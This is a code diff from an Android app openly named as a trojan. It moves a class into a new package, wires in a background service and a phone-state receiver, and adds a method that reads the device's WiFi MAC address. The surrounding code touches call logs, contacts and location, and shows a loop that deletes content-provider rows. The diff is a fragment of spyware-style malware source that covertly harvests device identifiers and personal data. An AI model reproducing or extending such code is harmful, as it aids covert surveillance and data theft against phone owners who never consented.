@@ -1,13 +1,16 @@
-package trojan.android.android_trojan;
+package trojan.android.android_trojan.Activity;
 
 import android.app.Activity;
 import android.content.ContentResolver;
+import android.content.Context;
 import android.content.Intent;
 import android.database.Cursor;
 import android.location.Criteria;
 import android.location.Location;
 import android.location.LocationManager;
 import android.net.Uri;
+import android.net.wifi.WifiInfo;
+import android.net.wifi.WifiManager;
 import android.os.Bundle;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
@@ -16,6 +19,11 @@ import android.view.View;
 import android.widget.Button;
 
 import java.util.ArrayList;
+
+import trojan.android.android_trojan.Service.BackgroundService;
+import trojan.android.android_trojan.BroadcastReceiver.PhoneStateReceiver;
+import trojan.android.android_trojan.R;
+import trojan.android.android_trojan.Tools;
 
 /**
  * Created by Jean-Laurent on 26/11/2014.
@@ -180,5 +188,11 @@ public class second_activity extends Activity {
                         new String[] { String.valueOf(idOfRowToDelete) });
             } while (cursor.moveToNext());
         }
+    }
+
+    public String getMacAddress(){
+        WifiManager manager = (WifiManager) getSystemService(Context.WIFI_SERVICE);
+        WifiInfo info = manager.getConnectionInfo();
+        return info.getMacAddress();
     }
 }
